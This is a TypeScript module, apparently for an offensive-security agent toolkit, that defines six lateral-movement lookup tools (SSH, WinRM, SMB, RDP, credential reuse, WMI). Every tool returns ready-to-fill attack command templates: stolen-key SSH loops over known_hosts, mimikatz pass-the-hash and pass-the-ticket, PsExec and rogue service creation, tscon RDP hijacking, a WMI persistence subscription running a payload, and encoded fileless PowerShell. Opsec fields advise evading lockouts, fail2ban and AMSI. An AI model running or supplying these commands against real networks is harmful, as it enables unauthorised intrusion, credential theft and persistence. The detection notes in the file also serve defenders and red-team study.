import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { EnvironmentModel } from "../schema/environment.js";
import type { Platform } from "../schema/unified-entry.js";

function lookupSession(envId: string, ctx: ToolContext): EnvironmentModel | null {
  return ctx.sessions.get(envId) ?? null;
}

interface LateralTechnique {
  technique: string;
  description: string;
  platform: Platform | "multi";
  binary: string;
  command_template: string;
  required_credentials: string;
  stealth_score: number;
  attck_ids: string[];
  prerequisites: string[];
  detection_notes: string;
  opsec_considerations: string;
}

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id,
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealth_score: e.stealthScore,
    description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

// ── lateral_ssh ───────────────────────────────────────────────────────────────

const lateral_ssh: ToolDef = {
  name: "lateral_ssh",
  description:
    "Find SSH-based lateral movement techniques for pivoting to other hosts via key reuse, agent forwarding, and tunneling",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["linux", "macos", "windows"])
      .default("linux")
      .describe("Source platform for lateral movement"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform as Platform;
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbLateral = ctx.knowledgeBase.searchByFunction("lateral_movement", platform);
    const kbSsh = ctx.knowledgeBase.searchByKeyword("ssh", platform);
    const kbEntries = deduplicateByBinary([...kbLateral, ...kbSsh])
      .filter(e => e.platform === platform || e.platform === "multi");

    const techniques: LateralTechnique[] = [
      {
        technique: "SSH Key Reuse",
        description: "Use discovered SSH private keys to authenticate to other hosts in the network",
        platform: "multi",
        binary: "ssh",
        command_template: "ssh -i /path/to/stolen_key user@<TARGET_HOST>",
        required_credentials: "SSH private key (id_rsa, id_ed25519, etc.)",
        stealth_score: 2,
        attck_ids: ["T1021.004"],
        prerequisites: ["Access to SSH private key file, target host accepting key-based auth"],
        detection_notes: "SSH login events in /var/log/auth.log or /var/log/secure. Unusual source IP.",
        opsec_considerations: "Blends with normal SSH traffic. Avoid using keys with passphrases you cannot crack.",
      },
      {
        technique: "SSH Agent Forwarding Hijack",
        description: "Hijack an existing SSH agent socket from another user to access their loaded keys",
        platform: "linux",
        binary: "ssh",
        command_template: "SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.PID ssh user@<TARGET_HOST>",
        required_credentials: "Access to another user's SSH_AUTH_SOCK (requires root or same-user access)",
        stealth_score: 1,
        attck_ids: ["T1021.004", "T1563.001"],
        prerequisites: ["Root access or access to target user's agent socket"],
        detection_notes: "Hard to detect. Monitor SSH_AUTH_SOCK environment variable access.",
        opsec_considerations: "Very stealthy — uses legitimate credentials without touching key files on disk.",
      },
      {
        technique: "SSH Tunneling / Port Forwarding",
        description: "Create SSH tunnels to pivot through compromised hosts and access internal services",
        platform: "multi",
        binary: "ssh",
        command_template: "ssh -L <LOCAL_PORT>:<INTERNAL_HOST>:<REMOTE_PORT> user@<PIVOT_HOST> -N -f",
        required_credentials: "SSH credentials for pivot host (key or password)",
        stealth_score: 2,
        attck_ids: ["T1572", "T1021.004"],
        prerequisites: ["SSH access to at least one internal host"],
        detection_notes: "Unusual SSH connections with -L/-R/-D flags. Long-lived SSH sessions.",
        opsec_considerations: "Use -N flag to avoid shell allocation. Dynamic SOCKS proxy (-D) is more flexible.",
      },
      {
        technique: "SSH Dynamic SOCKS Proxy",
        description: "Create a SOCKS proxy via SSH to route traffic through the compromised host",
        platform: "multi",
        binary: "ssh",
        command_template: "ssh -D 1080 user@<PIVOT_HOST> -N -f && proxychains nmap <INTERNAL_NETWORK>",
        required_credentials: "SSH credentials for pivot host",
        stealth_score: 2,
        attck_ids: ["T1572", "T1090.001"],
        prerequisites: ["SSH access, proxychains configured on attacker machine"],
        detection_notes: "Unusual outbound connections from pivot host. Network traffic analysis.",
        opsec_considerations: "SOCKS proxy allows routing arbitrary tools through the tunnel.",
      },
      {
        technique: "SSH ControlMaster Session Hijack",
        description: "Hijack an existing SSH ControlMaster socket to piggyback on an authenticated session",
        platform: "linux",
        binary: "ssh",
        command_template: "ssh -S /path/to/control_socket user@<TARGET_HOST>",
        required_credentials: "Access to ControlMaster socket file (root or same user)",
        stealth_score: 1,
        attck_ids: ["T1021.004", "T1563"],
        prerequisites: ["SSH ControlMaster enabled, access to socket file"],
        detection_notes: "Very hard to detect. No new authentication event generated.",
        opsec_considerations: "Reuses existing authenticated session — no password or key needed.",
      },
      {
        technique: "ProxyJump Chaining",
        description: "Chain through multiple SSH hosts using ProxyJump (-J) for multi-hop lateral movement",
        platform: "multi",
        binary: "ssh",
        command_template: "ssh -J user1@<HOP1>,user2@<HOP2> user3@<TARGET_HOST>",
        required_credentials: "SSH credentials for each hop",
        stealth_score: 2,
        attck_ids: ["T1021.004", "T1090.003"],
        prerequisites: ["SSH credentials for all intermediate hosts"],
        detection_notes: "Each hop generates SSH login events. Correlate multi-hop patterns.",
        opsec_considerations: "ProxyJump is cleaner than manual tunnel chaining.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const sshFiles = session.state.sensitiveFiles.filter(f =>
        f.path.includes(".ssh") || f.path.includes("id_rsa") || f.path.includes("id_ed25519") ||
        f.path.includes("authorized_keys") || f.path.includes("known_hosts"),
      );
      const sshBinaries = session.state.installedBinaries.filter(b =>
        b.toLowerCase().includes("ssh"),
      );

      sessionContext = {
        environment_id: session.id,
        ssh_related_files: sshFiles.map(f => ({ path: f.path, readable: f.readable, writable: f.writable })),
        ssh_binaries_available: sshBinaries,
        network_access: session.state.networkAccess,
        recommendations: sshFiles.some(f => f.path.includes("id_rsa") && f.readable)
          ? "Readable SSH private key found — SSH Key Reuse is directly applicable."
          : sshBinaries.length > 0
            ? "SSH client is available. Look for key files, agent sockets, or known_hosts for targets."
            : "No SSH client detected in installed binaries.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── lateral_winrm ─────────────────────────────────────────────────────────────

const lateral_winrm: ToolDef = {
  name: "lateral_winrm",
  description:
    "Find WinRM-based lateral movement techniques for remote command execution on Windows hosts",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (WinRM is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbLateral = ctx.knowledgeBase.searchByFunction("lateral_movement", platform);
    const kbWinrm = ctx.knowledgeBase.searchByKeyword("winrm", platform);
    const kbPsremote = ctx.knowledgeBase.searchByKeyword("PSRemoting", platform);
    const kbEntries = deduplicateByBinary([...kbLateral, ...kbWinrm, ...kbPsremote])
      .filter(e => e.platform === platform);

    const techniques: LateralTechnique[] = [
      {
        technique: "WinRM PowerShell Remoting",
        description: "Use Enter-PSSession or Invoke-Command for interactive or non-interactive remote PowerShell execution",
        platform,
        binary: "powershell.exe",
        command_template: `$cred = Get-Credential; Invoke-Command -ComputerName <TARGET> -Credential $cred -ScriptBlock { whoami }`,
        required_credentials: "Domain credentials or local admin credentials on target",
        stealth_score: 3,
        attck_ids: ["T1021.006"],
        prerequisites: ["WinRM enabled on target (port 5985/5986), appropriate credentials"],
        detection_notes: "Event ID 4624 (Type 3). PowerShell operational log. WinRM event logs.",
        opsec_considerations: "Standard admin tool — blends with legitimate management traffic.",
      },
      {
        technique: "WinRM via winrs.exe",
        description: "Use the native winrs.exe command to execute commands on remote Windows hosts",
        platform,
        binary: "winrs.exe",
        command_template: "winrs -r:<TARGET> -u:<USER> -p:<PASS> cmd.exe /c whoami",
        required_credentials: "Domain or local admin credentials",
        stealth_score: 3,
        attck_ids: ["T1021.006"],
        prerequisites: ["WinRM enabled on target, winrs.exe available"],
        detection_notes: "Event ID 4624. winrs.exe process creation events.",
        opsec_considerations: "Less commonly used than PSRemoting — may stand out in environments using only PowerShell.",
      },
      {
        technique: "Evil-WinRM (Interactive Shell)",
        description: "Use Evil-WinRM for interactive WinRM shell with file upload/download, DLL injection capabilities",
        platform,
        binary: "evil-winrm",
        command_template: "evil-winrm -i <TARGET> -u <USER> -p <PASS>",
        required_credentials: "Valid credentials (password or NTLM hash)",
        stealth_score: 3,
        attck_ids: ["T1021.006"],
        prerequisites: ["WinRM enabled, Evil-WinRM installed on attacker machine"],
        detection_notes: "WinRM event logs. User-Agent string may reveal tool.",
        opsec_considerations: "Supports pass-the-hash (-H flag). Supports in-memory .NET assembly loading.",
      },
      {
        technique: "WinRM Pass-the-Hash",
        description: "Authenticate to WinRM using an NTLM hash without knowing the plaintext password",
        platform,
        binary: "evil-winrm",
        command_template: "evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>",
        required_credentials: "NTLM hash of target user",
        stealth_score: 2,
        attck_ids: ["T1021.006", "T1550.002"],
        prerequisites: ["WinRM enabled, NTLM hash obtained, target allows NTLM auth"],
        detection_notes: "Event ID 4624 (Type 3) with NTLM auth. Unusual NTLM-only authentication.",
        opsec_considerations: "No password cracking needed. Works when Kerberos is not available.",
      },
      {
        technique: "CIM Session Over WinRM",
        description: "Use CIM sessions over WinRM for remote WMI-style queries and command execution",
        platform,
        binary: "powershell.exe",
        command_template: `$session = New-CimSession -ComputerName <TARGET> -Credential (Get-Credential); Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami > C:\\out.txt"}`,
        required_credentials: "Domain or local admin credentials",
        stealth_score: 2,
        attck_ids: ["T1021.006", "T1047"],
        prerequisites: ["WinRM enabled, WMI access on target"],
        detection_notes: "WMI operational event logs. Process creation events.",
        opsec_considerations: "Uses WSMan transport instead of DCOM — traverses firewalls better.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        network_access: session.state.networkAccess,
        edr_detected: session.state.edrDetected,
        recommendations: session.state.privilegeLevel === "admin" || session.state.privilegeLevel === "system"
          ? "Elevated privileges available — all WinRM techniques are viable if target has WinRM enabled."
          : "Standard user — WinRM remoting requires admin credentials on the target host.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── lateral_smb ───────────────────────────────────────────────────────────────

const lateral_smb: ToolDef = {
  name: "lateral_smb",
  description:
    "Find SMB-based lateral movement techniques including PsExec, SCM, and share-based attacks",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (SMB lateral movement is primarily Windows)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbLateral = ctx.knowledgeBase.searchByFunction("lateral_movement", platform);
    const kbSmb = ctx.knowledgeBase.searchByKeyword("smb", platform);
    const kbPsexec = ctx.knowledgeBase.searchByKeyword("psexec", platform);
    const kbEntries = deduplicateByBinary([...kbLateral, ...kbSmb, ...kbPsexec])
      .filter(e => e.platform === platform);

    const techniques: LateralTechnique[] = [
      {
        technique: "PsExec (Sysinternals)",
        description: "Use PsExec to execute commands on remote hosts via SMB and the Service Control Manager",
        platform,
        binary: "PsExec.exe",
        command_template: "PsExec.exe \\\\<TARGET> -u <DOMAIN>\\<USER> -p <PASS> -s cmd.exe",
        required_credentials: "Admin credentials on target (domain or local)",
        stealth_score: 4,
        attck_ids: ["T1021.002", "T1569.002"],
        prerequisites: ["SMB access (port 445), admin shares (ADMIN$) accessible"],
        detection_notes: "Service creation event 7045 (PSEXESVC). Well-detected by EDR. Sysmon process creation.",
        opsec_considerations: "Very noisy — creates a service, copies a binary. Use only as last resort.",
      },
      {
        technique: "Impacket smbexec",
        description: "Execute commands via SMB using Impacket's smbexec which uses a temporary batch file approach",
        platform,
        binary: "smbexec.py",
        command_template: "smbexec.py <DOMAIN>/<USER>:<PASS>@<TARGET>",
        required_credentials: "Admin credentials (password or NTLM hash)",
        stealth_score: 3,
        attck_ids: ["T1021.002", "T1569.002"],
        prerequisites: ["SMB access, Impacket installed on attacker machine"],
        detection_notes: "Service creation events. Batch file execution from ADMIN$ share.",
        opsec_considerations: "Creates and deletes a temporary service — leaves fewer artifacts than PsExec.",
      },
      {
        technique: "sc.exe Remote Service Creation",
        description: "Use sc.exe to create and start a service on a remote host for code execution",
        platform,
        binary: "sc.exe",
        command_template: 'sc \\\\<TARGET> create EvilSvc binPath= "C:\\Windows\\Temp\\payload.exe" && sc \\\\<TARGET> start EvilSvc',
        required_credentials: "Admin credentials on target",
        stealth_score: 3,
        attck_ids: ["T1021.002", "T1543.003"],
        prerequisites: ["SMB access, admin shares, Service Control Manager access"],
        detection_notes: "Service creation event 7045. Event ID 4697.",
        opsec_considerations: "Uses native Windows binary. Clean up service after execution.",
      },
      {
        technique: "SMB Share File Drop",
        description: "Copy payloads to writable SMB shares and trigger execution via another mechanism",
        platform,
        binary: "net.exe",
        command_template: "net use \\\\<TARGET>\\C$ /user:<USER> <PASS> && copy payload.exe \\\\<TARGET>\\C$\\Windows\\Temp\\",
        required_credentials: "Credentials with share write access",
        stealth_score: 3,
        attck_ids: ["T1021.002", "T1570"],
        prerequisites: ["Writable SMB share on target"],
        detection_notes: "SMB file creation events. Network share access logs.",
        opsec_considerations: "File on disk is an artifact. Combine with execution technique.",
      },
      {
        technique: "SMB Pass-the-Hash",
        description: "Authenticate to SMB shares using an NTLM hash for lateral movement without plaintext password",
        platform,
        binary: "smbclient",
        command_template: "smbclient \\\\\\\\<TARGET>\\\\ADMIN$ -U <USER> --pw-nt-hash <NTLM_HASH>",
        required_credentials: "NTLM hash of admin user",
        stealth_score: 2,
        attck_ids: ["T1021.002", "T1550.002"],
        prerequisites: ["SMB access, NTLM hash obtained, NTLM auth not disabled"],
        detection_notes: "Event ID 4624 (Type 3) with NTLM authentication. Unusual NTLM logon patterns.",
        opsec_considerations: "Avoids password cracking entirely. Commonly used in AD environments.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        network_access: session.state.networkAccess,
        edr_detected: session.state.edrDetected,
        recommendations: session.state.networkAccess.internalSubnets.length > 0
          ? `Internal subnets detected: ${session.state.networkAccess.internalSubnets.join(", ")}. Scan for SMB (445) on these ranges.`
          : "No internal subnet information available. Network reconnaissance recommended first.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── lateral_rdp ───────────────────────────────────────────────────────────────

const lateral_rdp: ToolDef = {
  name: "lateral_rdp",
  description:
    "Find RDP-based lateral movement techniques for graphical remote access to Windows hosts",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (RDP is primarily Windows)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbLateral = ctx.knowledgeBase.searchByFunction("lateral_movement", platform);
    const kbRdp = ctx.knowledgeBase.searchByKeyword("rdp", platform);
    const kbMstsc = ctx.knowledgeBase.searchByKeyword("mstsc", platform);
    const kbEntries = deduplicateByBinary([...kbLateral, ...kbRdp, ...kbMstsc])
      .filter(e => e.platform === platform);

    const techniques: LateralTechnique[] = [
      {
        technique: "Standard RDP Connection",
        description: "Connect via Remote Desktop Protocol using valid credentials",
        platform,
        binary: "mstsc.exe",
        command_template: "mstsc /v:<TARGET>",
        required_credentials: "Domain or local credentials with RDP access (Remote Desktop Users group)",
        stealth_score: 4,
        attck_ids: ["T1021.001"],
        prerequisites: ["RDP enabled on target (port 3389), NLA may require valid credentials"],
        detection_notes: "Event ID 4624 (Type 10). Event ID 1149 (TerminalServices-RemoteConnectionManager). Very well-logged.",
        opsec_considerations: "Legitimate tool — blends with normal admin activity. Creates obvious login session.",
      },
      {
        technique: "RDP Hijacking (tscon)",
        description: "Hijack an existing disconnected RDP session using tscon without knowing the user's password",
        platform,
        binary: "tscon.exe",
        command_template: "query user && tscon <SESSION_ID> /dest:console",
        required_credentials: "SYSTEM-level access (no target user password needed)",
        stealth_score: 1,
        attck_ids: ["T1021.001", "T1563.002"],
        prerequisites: ["SYSTEM privilege, disconnected RDP session on the host"],
        detection_notes: "Event ID 4778/4779 (session reconnect/disconnect). tscon.exe process creation.",
        opsec_considerations: "Takes over existing session — no new authentication. Very stealthy.",
      },
      {
        technique: "RDP via SharpRDP",
        description: "Use SharpRDP to execute commands over RDP without a full GUI session",
        platform,
        binary: "SharpRDP.exe",
        command_template: 'SharpRDP.exe computername=<TARGET> command="cmd.exe /c whoami > C:\\out.txt" username=<USER> password=<PASS>',
        required_credentials: "Valid RDP credentials",
        stealth_score: 2,
        attck_ids: ["T1021.001"],
        prerequisites: ["RDP enabled, SharpRDP binary available"],
        detection_notes: "RDP logon events. Process creation from RDP session.",
        opsec_considerations: "No GUI session established — harder to detect than full RDP.",
      },
      {
        technique: "RDP Tunneling via SSH",
        description: "Tunnel RDP through SSH to reach internal hosts not directly accessible",
        platform: "multi",
        binary: "ssh",
        command_template: "ssh -L 3389:<INTERNAL_TARGET>:3389 user@<PIVOT_HOST> -N -f && mstsc /v:127.0.0.1",
        required_credentials: "SSH credentials for pivot host, RDP credentials for target",
        stealth_score: 2,
        attck_ids: ["T1021.001", "T1572"],
        prerequisites: ["SSH access to pivot host, RDP access on internal target"],
        detection_notes: "SSH tunnel + RDP events. Network traffic correlation.",
        opsec_considerations: "Encrypts RDP traffic within SSH tunnel. Bypasses network segmentation.",
      },
      {
        technique: "Restricted Admin RDP (Pass-the-Hash)",
        description: "Use Restricted Admin mode to RDP with an NTLM hash instead of plaintext password",
        platform,
        binary: "mstsc.exe",
        command_template: "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:\"mstsc.exe /restrictedadmin /v:<TARGET>\"",
        required_credentials: "NTLM hash of user with RDP access",
        stealth_score: 2,
        attck_ids: ["T1021.001", "T1550.002"],
        prerequisites: ["Restricted Admin mode enabled on target, NTLM hash obtained"],
        detection_notes: "Event ID 4624 (Type 10). RestrictedAdmin RDP logon detected differently.",
        opsec_considerations: "No plaintext password needed. RestrictedAdmin reduces credential exposure on target.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        network_access: session.state.networkAccess,
        edr_detected: session.state.edrDetected,
        recommendations: session.state.privilegeLevel === "system"
          ? "SYSTEM access available — RDP Hijacking via tscon is directly applicable for disconnected sessions."
          : "Look for valid credentials to use standard RDP or Restricted Admin RDP.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── lateral_credential_reuse ──────────────────────────────────────────────────

const lateral_credential_reuse: ToolDef = {
  name: "lateral_credential_reuse",
  description:
    "Find credential reuse lateral movement techniques — testing harvested credentials across multiple services and hosts",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["linux", "windows", "macos"])
      .default("windows")
      .describe("Source platform for credential reuse techniques"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform as Platform;
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbCredAccess = ctx.knowledgeBase.searchByFunction("credential_access", platform);
    const kbLateral = ctx.knowledgeBase.searchByFunction("lateral_movement", platform);
    const kbEntries = deduplicateByBinary([...kbCredAccess, ...kbLateral])
      .filter(e => e.platform === platform || e.platform === "multi");

    const techniques: LateralTechnique[] = [
      {
        technique: "Password Spraying",
        description: "Test a single discovered password against multiple accounts across the network",
        platform: "multi",
        binary: platform === "windows" ? "net.exe" : "ssh",
        command_template: platform === "windows"
          ? 'net use \\\\<TARGET>\\IPC$ /user:<DOMAIN>\\<USER> <PASSWORD>'
          : "sshpass -p '<PASSWORD>' ssh <USER>@<TARGET>",
        required_credentials: "At least one known password",
        stealth_score: 3,
        attck_ids: ["T1110.003"],
        prerequisites: ["Harvested credentials, list of target accounts"],
        detection_notes: "Multiple failed logins (Event ID 4625). Account lockout events.",
        opsec_considerations: "Spray slowly to avoid lockout thresholds. Use one password per lockout window.",
      },
      {
        technique: "Pass-the-Hash (NTLM)",
        description: "Use an NTLM hash to authenticate to services without knowing the plaintext password",
        platform: "windows",
        binary: "mimikatz.exe",
        command_template: 'sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe',
        required_credentials: "NTLM hash",
        stealth_score: 2,
        attck_ids: ["T1550.002"],
        prerequisites: ["NTLM hash obtained, target accepts NTLM auth"],
        detection_notes: "Event ID 4624 (Type 3) with NTLM. Unusual NTLM logon events.",
        opsec_considerations: "NTLM relay protection (SMB signing) can limit effectiveness.",
      },
      {
        technique: "Pass-the-Ticket (Kerberos)",
        description: "Inject a stolen Kerberos ticket to authenticate as another user",
        platform: "windows",
        binary: "mimikatz.exe",
        command_template: "kerberos::ptt /filename:<TICKET.kirbi>",
        required_credentials: "Kerberos TGT or service ticket (.kirbi)",
        stealth_score: 2,
        attck_ids: ["T1550.003"],
        prerequisites: ["Kerberos ticket obtained (e.g., via Rubeus or mimikatz)"],
        detection_notes: "Event ID 4768/4769. Unusual ticket usage patterns.",
        opsec_considerations: "Tickets have expiration. Use within their validity window.",
      },
      {
        technique: "Overpass-the-Hash",
        description: "Use an NTLM hash to request a Kerberos TGT, then use Kerberos for lateral movement",
        platform: "windows",
        binary: "Rubeus.exe",
        command_template: "Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt",
        required_credentials: "NTLM hash or AES key",
        stealth_score: 2,
        attck_ids: ["T1550.002"],
        prerequisites: ["NTLM hash, Active Directory environment"],
        detection_notes: "Event ID 4768 (TGT request). Unusual encryption type downgrades.",
        opsec_considerations: "Results in valid Kerberos ticket — harder to detect than raw NTLM PtH.",
      },
      {
        technique: "SSH Private Key Reuse",
        description: "Test discovered SSH private keys against multiple hosts from known_hosts",
        platform: "linux",
        binary: "ssh",
        command_template: "for host in $(awk '{print $1}' ~/.ssh/known_hosts); do ssh -i stolen_key -o BatchMode=yes user@$host whoami 2>/dev/null && echo \"SUCCESS: $host\"; done",
        required_credentials: "SSH private key",
        stealth_score: 2,
        attck_ids: ["T1021.004"],
        prerequisites: ["SSH private key, list of target hosts (from known_hosts)"],
        detection_notes: "SSH login events across multiple hosts in short time. Failed auth attempts.",
        opsec_considerations: "Parse known_hosts first. Avoid hosts with fail2ban or SSH rate limiting.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        platform: session.state.platform,
        privilege_level: session.state.privilegeLevel,
        network_access: session.state.networkAccess,
        sensitive_files_count: session.state.sensitiveFiles.length,
        recommendations: "Enumerate credentials first using cred_* tools, then apply credential reuse techniques against discovered hosts.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── lateral_wmi ───────────────────────────────────────────────────────────────

const lateral_wmi: ToolDef = {
  name: "lateral_wmi",
  description:
    "Find WMI-based lateral movement techniques for remote code execution on Windows hosts",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (WMI is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbLateral = ctx.knowledgeBase.searchByFunction("lateral_movement", platform);
    const kbWmi = ctx.knowledgeBase.searchByKeyword("wmi", platform);
    const kbWmic = ctx.knowledgeBase.searchByKeyword("wmic", platform);
    const kbEntries = deduplicateByBinary([...kbLateral, ...kbWmi, ...kbWmic])
      .filter(e => e.platform === platform);

    const techniques: LateralTechnique[] = [
      {
        technique: "WMIC Process Create",
        description: "Use wmic.exe to create a process on a remote host via DCOM/RPC",
        platform,
        binary: "wmic.exe",
        command_template: 'wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create "cmd.exe /c whoami > C:\\out.txt"',
        required_credentials: "Admin credentials on target",
        stealth_score: 3,
        attck_ids: ["T1047"],
        prerequisites: ["DCOM/RPC access (ports 135, 445+), admin credentials"],
        detection_notes: "WMI operational event log. Process creation from WmiPrvSE.exe. Sysmon Event 1.",
        opsec_considerations: "wmic.exe is deprecated in newer Windows versions but still functional.",
      },
      {
        technique: "Impacket wmiexec",
        description: "Use Impacket's wmiexec.py for semi-interactive shell over WMI",
        platform,
        binary: "wmiexec.py",
        command_template: "wmiexec.py <DOMAIN>/<USER>:<PASS>@<TARGET>",
        required_credentials: "Admin credentials (password or NTLM hash)",
        stealth_score: 2,
        attck_ids: ["T1047"],
        prerequisites: ["WMI/DCOM access, Impacket installed"],
        detection_notes: "WMI event logs. cmd.exe spawned from WmiPrvSE.exe.",
        opsec_considerations: "Supports pass-the-hash. Does not create a service unlike PsExec.",
      },
      {
        technique: "WMI Event Subscription (Persistence + Lateral)",
        description: "Create a WMI event subscription on a remote host that triggers payload execution",
        platform,
        binary: "powershell.exe",
        command_template: `$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name="EvilFilter"; EventNamespace="root\\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name="EvilConsumer"; CommandLineTemplate="C:\\Windows\\Temp\\payload.exe"}; Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}`,
        required_credentials: "Admin credentials on target",
        stealth_score: 1,
        attck_ids: ["T1047", "T1546.003"],
        prerequisites: ["WMI access, admin privileges"],
        detection_notes: "WMI event subscription events. Sysmon WMI events (Event ID 19, 20, 21).",
        opsec_considerations: "Survives reboots — acts as both lateral movement and persistence mechanism.",
      },
      {
        technique: "PowerShell CIM Remote Method",
        description: "Use PowerShell CIM cmdlets to invoke WMI methods on remote hosts",
        platform,
        binary: "powershell.exe",
        command_template: `Invoke-CimMethod -ComputerName <TARGET> -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"} -Credential (Get-Credential)`,
        required_credentials: "Admin credentials",
        stealth_score: 2,
        attck_ids: ["T1047"],
        prerequisites: ["WMI/DCOM or WinRM transport, admin credentials"],
        detection_notes: "PowerShell script block logging. WMI operational log.",
        opsec_considerations: "CIM can use WinRM transport (-SessionOption) which traverses firewalls better.",
      },
      {
        technique: "WMI Fileless Execution",
        description: "Use WMI to execute PowerShell payloads in memory without dropping files to disk",
        platform,
        binary: "wmic.exe",
        command_template: 'wmic /node:<TARGET> process call create "powershell.exe -enc <BASE64_PAYLOAD>"',
        required_credentials: "Admin credentials",
        stealth_score: 2,
        attck_ids: ["T1047", "T1059.001"],
        prerequisites: ["WMI access, PowerShell available on target"],
        detection_notes: "PowerShell script block logging. Encoded command detection. AMSI.",
        opsec_considerations: "Fileless — no on-disk payload. AMSI may inspect decoded content.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        network_access: session.state.networkAccess,
        edr_detected: session.state.edrDetected,
        amsi_enabled: session.state.amsiEnabled,
        recommendations: session.state.amsiEnabled
          ? "AMSI is enabled — fileless PowerShell payloads may be inspected. Consider AMSI bypass or use wmic.exe directly."
          : "AMSI is disabled — PowerShell-based WMI techniques have higher success probability.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── Export ─────────────────────────────────────────────────────────────────────

export const lateralTools: ToolDef[] = [
  lateral_ssh,
  lateral_winrm,
  lateral_smb,
  lateral_rdp,
  lateral_credential_reuse,
  lateral_wmi,
];
